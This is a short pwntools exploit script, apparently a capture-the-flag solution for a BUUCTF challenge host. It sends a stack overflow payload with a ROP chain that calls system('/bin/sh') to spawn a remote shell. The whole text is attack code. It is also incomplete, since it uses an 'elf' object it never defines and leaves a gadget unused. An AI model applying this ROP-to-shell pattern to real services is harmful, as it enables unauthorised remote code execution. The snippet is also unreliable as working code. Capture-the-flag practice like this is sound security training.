from pwn import*
r=remote('node5.buuoj.cn',25925)

system=elf.sym['system']
binsh=next(elf.search(b'/bin/sh'))
rdi=0x400683
ret=0x400479

payload=b'a'*0x18+p64(rdi)+p64(binsh)+p64(system)
r.sendline(payload)
